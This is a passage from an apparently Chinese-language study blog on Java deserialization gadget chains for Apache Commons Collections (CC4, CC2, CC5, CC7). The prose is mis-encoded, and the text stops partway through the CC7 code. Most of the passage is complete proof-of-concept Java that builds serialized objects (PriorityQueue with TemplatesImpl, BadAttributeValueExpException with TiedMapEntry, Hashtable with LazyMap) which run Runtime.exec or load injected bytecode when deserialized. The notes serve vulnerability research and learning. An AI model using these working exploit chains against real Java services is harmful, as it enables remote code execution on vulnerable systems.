class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ­¤æ—¶è¿˜æ‰§ä¸äº†ï¼Œè°ƒè¯•çœ‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222241737.png" alt="image-20240404222241737"></p><p>æ­¤æ—¶sizeä¸º0ï¼Œ è¿›ä¸å»ï¼Œ å¦‚æœæƒ³è¦è¿›å…¥ï¼Œsizeæœ€å°‘ä¸º2ï¼Œå°è¯•æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼šæŠ¥é”™ï¼ˆè™½ç„¶èƒ½å¼¹å‡ºè®¡ç®—å™¨ä½†æ˜¯ä¸æ˜¯æƒ³è¦çš„ï¼‰æˆ‘ä»¬è·Ÿè¿›put</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222355885.png" alt="image-20240404222355885"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222359129.png" alt="image-20240404222359129"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222406533.png" alt="image-20240404222406533"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222410306.png" alt="image-20240404222410306"></p><p>å¯è§åœ¨putçš„æ—¶å€™å°±è°ƒç”¨äº†compareæ–¹æ³•ï¼Œä½†æˆ‘ä»¬éœ€è¦åœ¨ readObject çš„æ—¶å€™æ‰è°ƒç”¨æ‰€ä»¥æˆ‘ä»¬è¦åœ¨å‰é¢å°†ä¸€äº›ä¸œè¥¿èµ‹å€¼ä¸ºåˆ«çš„ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å†æ”¹å›æ¥</p><h3 id="poc">poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://æ¼æ´å¤ç°/cc/CC1/src/main/java/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC2">CC2</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><p>ç›´æ¥ç»™POCäº†ï¼Œå’ŒCC4å·®ä¸å¤šçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC42</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://æ¼æ´å¤ç°/cc/CC1/src/main/java/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC5">CC5</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><h3 id="BadAttributeValueExpException">BadAttributeValueExpException</h3><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232502897.png" alt="image-20240404232502897"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232507378.png" alt="image-20240404232507378"></p><p>æ³¨æ„åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼šç›´æ¥è°ƒç”¨ toStringæ–¹æ³• ï¼Œæ‰€ä»¥ä¸€å¼€å§‹éœ€è¦èµ‹å€¼ä¸€ä¸ªå…¶ä»–çš„ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å†ç»™ TiedMapEntry</p><h3 id="TiedMapEntry">TiedMapEntry</h3><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232533227.png" alt="image-20240404232533227"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232537113.png" alt="image-20240404232537113"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232541987.png" alt="image-20240404232541987"></p><h3 id="POC">POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºInvocationHandler</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> BadAttributeValueExpException.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(badAttributeValueExpException);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC7">CC7</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404233522172.png" alt="image-20240404233522172"></p><p>å…¥å£ç‚¹åˆ©ç”¨äº†HashTableé€šè¿‡readObjectä¸­è°ƒç”¨<code>reconstitutionPut</code>,ç„¶ååˆè°ƒç”¨äº†equalsï¼Œç„¶åæ‰¾åˆ°äº†AbstractMapDecoratorç±»ä¸­çš„equalsæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•ã€‚</p><p>ç„¶ååœ¨equalsä¸­å­˜åœ¨ä¸€ä¸ªå“ˆå¸Œç¢°æ’ï¼Œæ¯”è¾ƒç½•è§ï¼Œè¿™é‡Œå°±ä¸å±•å¼€æ¥ç ”ç©¶äº†ï¼Œå¯ä»¥å‚è€ƒfakesoulå¸ˆå‚…å†™çš„æ–‡ç« ï¼š</p><p><a href="https://xz.aliyun.com/t/12207#toc-10">https://xz.aliyun.com/t/12207#toc-10</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException,</span><br><span class="line">            IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] fakeformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">2</span>)&#125;;</span><br><span class="line">        Transformer[] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,</span><br><span class="line">                        Class[].class&#125;, <span class="keyword">new</span> <span class="title 